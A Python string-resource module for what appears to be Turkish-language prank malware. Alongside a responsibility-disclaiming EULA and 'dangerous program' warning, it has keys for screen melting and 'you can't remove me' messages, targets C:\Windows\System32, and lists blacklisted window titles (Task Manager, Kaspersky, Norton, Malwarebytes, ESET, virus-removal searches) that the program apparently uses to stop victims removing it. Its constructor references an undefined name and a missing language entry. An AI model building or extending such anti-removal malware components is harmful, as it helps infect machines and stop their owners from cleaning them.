from .util import get_lang


class strings:
    string = {
        "tr_TR":{
            "string_welcome":"Hoşgeldiniz",
            "string_eula":"NOT:Bu programı çalıştırarak bütün sorumluluğu kabul etmektesiniz bu program sadece yazılım geliştiricileri için tersine mühendislik uzmanları için geliştirilmiştir bilgisayarınıza gelecek sorunlardan şahsiyetim sorumlu değildir bu mesajı okuyarak ve aşağıda ki kutucuğu onaylarak bütün sorumluluğu kendi üzerinize almaktasanız",
            "string_user_accept_msg":"Yukarıda olan metni okudum ve sorumluluğu kabul ediyorum",
            "string_user_decline_msg":"Kabul etmiyorum",
            "string_valid_cipher_key":"Doğrulama başarılı",
            "string_err_invalid_cipher_key":"Hatalı Anahtar",
            "string_user_warning_note":"NOT:Program tehlikelidir ve lütfen gerçek bir bilgisayarda açmayınız açılmaması için engel koyulmuştur",


            "string_you_cant_remove_me":"",
            "string_user_opened_not_allowed_process_msg":"",
            "string_user_opened_not_allowed_process_msg_stage01":"",
            "string_user_opened_not_allowed_process_msg_stage02":"",
            "string_user_opened_not_allowed_process_msg_stage03":"",
            "string_user_opened_not_allowed_process_msg_stage04":"",
            
            "string_user_have_blacklisted_program":"Kullanılması yasak program kullandın Program ismi: %s PID:%s",

            "string_user_kidding":"",
            "string_file_dont_click_me":"bana_tıklama.txt",
            "string_user_i_said_to_you_dont_click_to_me":"",
            

            "string_user_screen_melt":"",

            "string_user_opened_not_allowed_wintitles":[
                "görev yöneticisi",
                "kaspersky indir",
                "kaspersky",
                "virüs silme programları",
                "virüs",
                "antivirus indir",
                "virüs temizleme",
                "virüsleri nasıl temizlerim",
                "Virüs nasıl silinir",
                "Bilgisayarıma virüs bulaştığını nasıl anlarım",
                "bilgisayarımda virüs var mı",
                "norton",
                "malwarebytes",
                "norton",
                "mcaffe",
                "eset",
                "nod32",
            ]
        }
    }
    string_target_dir = r"C:\Windows\System32"
    def __init__(self) -> None:
        self.__target_lang = string["en_EN"] if self.string.get(get_lang()) is None else self.string[get_lang()]
        for key,value in self.__target_lang.items():
            setattr(self,key,value)
    def __repr__(self) -> str:
        return "<%s target_lang = %s >" % (self.__class__.__name__,get_lang())
